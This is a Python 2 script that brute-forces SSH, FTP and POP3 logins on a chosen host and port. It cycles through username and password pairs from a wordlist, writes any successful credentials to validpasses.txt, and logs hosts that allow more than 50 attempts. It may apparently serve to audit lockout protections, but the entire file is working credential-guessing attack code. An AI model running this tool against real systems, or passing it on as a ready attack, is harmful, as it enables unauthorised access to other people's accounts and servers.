#!/usr/bin/python
import redis, paramiko, socket, datetime, os, sys, subprocess, uuid, time
from ftplib import FTP
from poplib import POP3

r_server = redis.Redis("localhost")
attempts = 80

def log(msg):
	timestamp = datetime.datetime.now().strftime('%b %d %H:%M:%S')
	r_server.set("LastLog", "%s Bruteforcer[%d]: %s" % (timestamp, os.getpid(), msg))
	return "%s Bruteforcer[%d]: %s" % (timestamp, os.getpid(), msg)
	sys.stdout.flush()


def generateAuthPair():
	return (str(uuid.uuid4()), str(uuid.uuid4()))


def SSHBrute(host, port):
	
	scancurrentline = 0
	
	credentials = open('wordlist.txt', 'r')

	scanfilelen = int(subprocess.check_output(["wc", "-l", "wordlist.txt"]).split()[0])

	for attempt in range(0, attempts):

		if (scancurrentline >= scanfilelen):

			tstusername, tstpassword = generateAuthPair()

		else:

			line = open('wordlist.txt', 'r').readlines()[scancurrentline]
			line = line.rstrip('\n')
			tstusername, tstpassword = line.split(', ')
			scancurrentline += 1

		attempt += 1

		if (attempt > 50):
			print "Host is accepting bruteforce attempts\n"
			outfile2 = open("highattempt.txt", 'a')
			outfile2.write(r_server.get("LastLog") + '\n')
			outfile2.close()
			break

		print log("SSH Bruteforce attempt '%i' on host '%s' port '%s' with username '%s' and password '%s'" %(attempt, host, port, tstusername, tstpassword))

		time.sleep(int(r_server.get("Delay")))

		client = paramiko.SSHClient()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			client.connect(str(host), username=str(tstusername), password=str(tstpassword), port=int(port), timeout=10)
			login = log('Sucessful SSH authentication with username %s and password %s' % (tstusername, tstpassword))
			print login
			outfile = open("validpasses.txt", 'a')
			outfile.write(login + '\n')
			outfile.close()
			client.close()
		except paramiko.AuthenticationException, error:
			print log("Attempt: %i - Incorrect credentials User: %s and Password: %s for host %s and SSH protocol" % (attempt, tstusername, tstpassword, host))
			continue
		except socket.timeout:
			print log("Attempt: %i, host %s , user %s and password %s - Connection Timeout" %(attempt, host, tstusername, tstpassword))
			break
		except socket.error, error:
			print log("Attempt: %i, host %s , user %s and password %s - Error: %s" %(attempt, host, tstusername, tstpassword, error))
			break
		except paramiko.SSHException, error:
			print log("Attempt: %i, host %s , user %s and password %s - Error: %s \nMost probably this is caused by a missing host key" %(attempt, host, tstusername, tstpassword, error))
			break
		except Exception, error:
			print log("Attempt: %i, host %s , user %s and password %s - Unknown error: %s" %(attempt, host, tstusername, tstpassword, error))
			break
		client.close()

	credentials.close()


def FTPBrute(host, port):

	scancurrentline = 0
	
	credentials = open('wordlist.txt', 'r')

	scanfilelen = int(subprocess.check_output(["wc", "-l", "wordlist.txt"]).split()[0])

	for attempt in range(0, attempts):

		if (scancurrentline >= scanfilelen):

			tstusername, tstpassword = generateAuthPair()

		else:

			line = open('wordlist.txt', 'r').readlines()[scancurrentline]
			line = line.rstrip('\n')
			tstusername, tstpassword = line.split(', ')
			scancurrentline += 1

		attempt += 1

		if (attempt > 50):
			print "Host is accepting bruteforce attempts\n"
			outfile2 = open("highattempt.txt", 'a')
			outfile2.write(r_server.get("LastLog") + '\n')
			outfile2.close()
			break

		print log("FTP Bruteforce attempt '%i' on host '%s' port '%s' with username '%s' and password '%s'" %(attempt, host, port, tstusername, tstpassword))

		time.sleep(int(r_server.get("Delay")))

		try:
			ftpclient = FTP()
			ftpclient.connect(host=host, port=int(port), timeout=10)			
			ftpclient.login(tstusername, tstpassword)
			login = log('Sucessful FTP authentication with username %s and password %s' %(tstusername, tstpassword))
			print login
			outfile = open("validpasses.txt", 'a')
			outfile.write(login + '\n')
			outfile.close()
			ftpclient.close()
		except socket.timeout:
			print log("Attempt: %i, host %s , user %s and password %s - Connection Timeout" %(attempt, host, tstusername, tstpassword))
			break
		except socket.error, error:
			print log("Attempt: %i, host %s , user %s and password %s - Error %s" %(attempt, host, tstusername, tstpassword, error))
			break
		except Exception as E:
			if (str(E) == "530 Login authentication failed"):
				print log("Attempt: %i - Incorrect credentials User: %s and Password: %s for host %s and FTP protocol" %(attempt, tstusername, tstpassword, host))
				continue
			else:
				print log("Attempt: %i, host %s , user %s and password %s - generic exception = %s" %(attempt, host, tstusername, tstpassword, E))
				break
	credentials.close()


def POPBrute(host, port):

	scancurrentline = 0
	
	credentials = open('wordlist.txt', 'r')

	scanfilelen = int(subprocess.check_output(["wc", "-l", "wordlist.txt"]).split()[0])

	for attempt in range(0, attempts):

		if (scancurrentline >= scanfilelen):

			tstusername, tstpassword = generateAuthPair()

		else:

			line = open('wordlist.txt', 'r').readlines()[scancurrentline]
			line = line.rstrip('\n')
			tstusername, tstpassword = line.split(',')
			scancurrentline += 1

		attempt += 1

		if (attempt > 50):
			print "Host is accepting bruteforce attempts\n"
			outfile2 = open("highattempt.txt", 'a')
			outfile2.write(r_server.get("LastLog") + '\n')
			outfile2.close()
			break

		print log("POP3 Bruteforce attempt '%i' on host '%s' port '%s' with username '%s' and password '%s'" %(attempt, host, port, tstusername, tstpassword))

		time.sleep(int(r_server.get("Delay")))

		try:
			client = POP3(host=host, port=int(port), timeout=10)
			client.user(tstusername)
			client.pass_(tstpassword)
			login = log('Sucessful POP3 authentication with username %s and password %s' %(tstusername, tstpassword))
			print login
			outfile = open("validpasses.txt", 'a')
			outfile.write(login + '\n')
			outfile.close()
			client.quit()
		except socket.timeout:
			print log("Attempt: %i, host %s , user %s and password %s - Connection Timeout" %(attempt, host, tstusername, tstpassword))
			break
		except socket.error, error:
			print log("Attempt: %i, host %s , user %s and password %s - %s" %(attempt, host, tstusername, tstpassword, error))
			break
		except Exception as E:
			if (str(E) == "-ERR Unable to log on"):
				print log("Attempt: %i - Incorrect credentials User: %s and Password: %s for host %s and POP3 protocol" %(attempt, tstusername, tstpassword, host))
				continue
			else:
				print log("Attempt: %i, host %s , user %s and password %s - generic exception = %s" %(attempt, host, tstusername, tstpassword, E))
				break
	credentials.close()
